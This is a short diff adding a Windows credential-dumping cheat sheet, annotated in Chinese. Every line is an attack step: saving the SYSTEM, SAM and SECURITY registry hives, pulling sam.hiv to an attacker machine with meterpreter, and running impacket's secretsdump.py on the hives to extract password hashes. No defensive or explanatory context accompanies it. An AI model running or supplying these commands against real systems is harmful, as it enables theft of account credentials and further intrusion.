@@ -1,0 +1,9 @@
+reg save HKLM\SYSTEM sys.hiv
+
+reg save HKLM\SAM sam.hiv
+
+reg save hklm\security security.hiv
+
+使用meterpreter：download sam.hiv /tmp
+
+使用impacket的：python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
